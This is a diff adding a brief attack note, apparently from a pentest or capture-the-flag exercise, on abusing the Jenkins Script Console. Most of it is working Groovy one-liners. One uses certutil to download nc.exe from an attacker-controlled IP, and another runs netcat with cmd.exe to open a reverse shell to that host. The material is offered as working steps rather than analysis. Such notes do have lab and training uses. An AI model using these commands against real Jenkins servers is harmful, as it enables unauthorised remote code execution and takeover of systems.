@@ -1,0 +1,11 @@
+1. Go to Manage Jenkins, there you can exeucte the script via Script Console. This doesn't help much. But you need to go to Nodes and find the Master. Go the scrip console of that. 
+
+you can execute the command there as:
+println System.getenv("PATH")
+
+println "uname -a".execute().text
+
+println "certutil -urlcache -split -f http://10.13.14.242:8080/nc.exe nc.exe".execute().text To upload nc.exe
+
+println "nc.exe -e cmd.exe 10.13.14.242 443".execute().text  to get the reverse shell. 
+
